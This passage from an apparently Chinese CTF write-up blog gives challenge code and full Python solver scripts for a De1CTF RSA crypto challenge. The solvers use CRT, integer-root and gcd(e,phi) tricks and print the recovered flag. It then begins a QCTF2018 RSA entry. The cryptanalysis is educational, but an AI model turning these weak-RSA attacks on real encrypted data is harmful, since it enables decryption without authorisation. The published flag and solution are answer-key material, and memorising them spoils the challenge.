number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span><span class="token punctuation">,</span>    <span class="token number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span><span class="token punctuation">]</span>f <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> c<span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>ee1 <span class="token operator">=</span> <span class="token number">42</span>ee2 <span class="token operator">=</span> <span class="token number">3</span>ce1 <span class="token operator">=</span> <span class="token number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span>ce2 <span class="token operator">=</span> <span class="token number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span>tmp <span class="token operator">=</span> <span class="token number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span>n <span class="token operator">=</span> <span class="token number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span><span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span> ee1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> ce1<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e2 <span class="token operator">+</span> tmp<span class="token punctuation">,</span> ee2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> ce2<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">46531</span>n <span class="token operator">=</span> <span class="token number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span>c <span class="token operator">=</span> <span class="token number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span>hint <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>q1p <span class="token operator">*</span> q1q <span class="token operator">==</span> n<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>q1p <span class="token operator">&lt;</span> q1q<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>hint<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>q1 <span class="token operator">=</span> q1pq2 <span class="token operator">=</span> <span class="token number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span>c1 <span class="token operator">=</span> <span class="token number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span>c2 <span class="token operator">=</span> <span class="token number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> p <span class="token operator">*</span> q1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> p <span class="token operator">*</span> q2<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后求flag的这一步有些复杂。首先是看题目给出的两个式子就知道不是可以直接求得flag的，事实也正是如此。因为这里求得的<code>e1和phi1</code>、<code>e1和phi2</code>是有相同的最大公约数<strong>14</strong>的。可以先求出<code>m^14</code>这个值，然后再根据<code>q1、q2</code>跟<code>m^14</code>这个值的关系利用中国剩余定理求得关于<code>m^2</code>的另一个rsa的算式，可以直接求出m也就是flag。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span><span class="token punctuation">,</span>    <span class="token number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span><span class="token punctuation">,</span>    <span class="token number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span><span class="token punctuation">,</span>    <span class="token number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span><span class="token punctuation">,</span>    <span class="token number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span><span class="token punctuation">,</span>    <span class="token number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span><span class="token punctuation">,</span>    <span class="token number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>    c <span class="token operator">=</span> a2 <span class="token operator">-</span> a1    <span class="token keyword">if</span> c <span class="token operator">%</span> d <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">%</span> n2 <span class="token operator">+</span> n2<span class="token punctuation">)</span> <span class="token operator">%</span> n2    c <span class="token operator">=</span> c <span class="token operator">//</span> d    n1 <span class="token operator">=</span> n1 <span class="token operator">//</span> d    n2 <span class="token operator">=</span> n2 <span class="token operator">//</span> d    c <span class="token operator">*=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>    c <span class="token operator">%=</span> n2    c <span class="token operator">*=</span> n1 <span class="token operator">*</span> d    c <span class="token operator">+=</span> a1    <span class="token keyword">global</span> n3    <span class="token keyword">global</span> a3    n3 <span class="token operator">=</span> n1 <span class="token operator">*</span> n2 <span class="token operator">*</span> d    a3 <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">%</span> n3 <span class="token operator">+</span> n3<span class="token punctuation">)</span> <span class="token operator">%</span> n3    <span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">exCRT</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    a1 <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    n1 <span class="token operator">=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    le <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> le<span class="token punctuation">)</span><span class="token punctuation">:</span>        a2 <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        n2 <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> merge<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        a1 <span class="token operator">=</span> a3        n1 <span class="token operator">=</span> n3    <span class="token keyword">global</span> mod    mod <span class="token operator">=</span> n1    <span class="token keyword">return</span> <span class="token punctuation">(</span>a1 <span class="token operator">%</span> n1 <span class="token operator">+</span> n1<span class="token punctuation">)</span> <span class="token operator">%</span> n1p <span class="token operator">=</span> exCRT<span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">)</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>ee1 <span class="token operator">=</span> <span class="token number">42</span>ee2 <span class="token operator">=</span> <span class="token number">3</span>ce1 <span class="token operator">=</span> <span class="token number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span>ce2 <span class="token operator">=</span> <span class="token number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span>tmp <span class="token operator">=</span> <span class="token number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span>n <span class="token operator">=</span> <span class="token number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span><span class="token keyword">def</span> <span class="token function">rune</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> c <span class="token operator">+</span> k <span class="token operator">*</span> n        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span>e1 <span class="token operator">=</span> rune<span class="token punctuation">(</span>ee1<span class="token punctuation">,</span> n<span class="token punctuation">,</span> ce1<span class="token punctuation">)</span>e2 <span class="token operator">=</span> rune<span class="token punctuation">(</span>ee2<span class="token punctuation">,</span> n<span class="token punctuation">,</span> ce2<span class="token punctuation">)</span> <span class="token operator">-</span> tmp<span class="token keyword">print</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">46531</span>n <span class="token operator">=</span> <span class="token number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span>c <span class="token operator">=</span> <span class="token number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span><span class="token comment"># 上面的这个n是可以在线分解的，但是线下的时候不能用在线的环境哎</span>q1q <span class="token operator">=</span> <span class="token number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span>q1p <span class="token operator">=</span> n <span class="token operator">//</span> q1q<span class="token keyword">if</span> q1p <span class="token operator">></span> q1q<span class="token punctuation">:</span>    q1p<span class="token punctuation">,</span> q1q <span class="token operator">=</span> q1q<span class="token punctuation">,</span> q1pd <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>q1p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>hint <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!'</span>q1 <span class="token operator">=</span> q1pq2 <span class="token operator">=</span> <span class="token number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span>c1 <span class="token operator">=</span> <span class="token number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span>c2 <span class="token operator">=</span> <span class="token number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span><span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>e1 <span class="token operator">=</span> e1 <span class="token operator">//</span> <span class="token number">14</span>e2 <span class="token operator">=</span> e2 <span class="token operator">//</span> <span class="token number">14</span>d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>nn <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>aa <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>nn<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>nn<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q2<span class="token punctuation">)</span>a1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> p <span class="token operator">*</span> q1<span class="token punctuation">)</span> <span class="token operator">%</span> q1a2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> p <span class="token operator">*</span> q2<span class="token punctuation">)</span> <span class="token operator">%</span> q2aa<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a1<span class="token punctuation">)</span>aa<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exCRT_getequation</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    a1 <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    n1 <span class="token operator">=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    le <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> le<span class="token punctuation">)</span><span class="token punctuation">:</span>        a2 <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        n2 <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> merge<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        a1 <span class="token operator">=</span> a3        n1 <span class="token operator">=</span> n3    <span class="token keyword">return</span> <span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>m14<span class="token punctuation">,</span> n <span class="token operator">=</span> exCRT_getequation<span class="token punctuation">(</span>aa<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>  <span class="token comment"># 最终方程组 aa=n^14%q1*q2</span>m2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m14<span class="token punctuation">,</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="QCTF2018-Xman-RSA"><a href="#QCTF2018-Xman-RSA" class="headerlink" title="[QCTF2018]Xman-RSA"></a>[QCTF2018]Xman-RSA</h4><p>纳尼，没给出加密脚本？哦，原来是加密脚本也加密了。。。</p><p>看起来第一步是进行词频分析呀，这么大的内容</p><p><img src="/2021/05/28/CTF/image-20210729211301798.png" alt></p><p>把第一个再拿出来改一改就行了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span 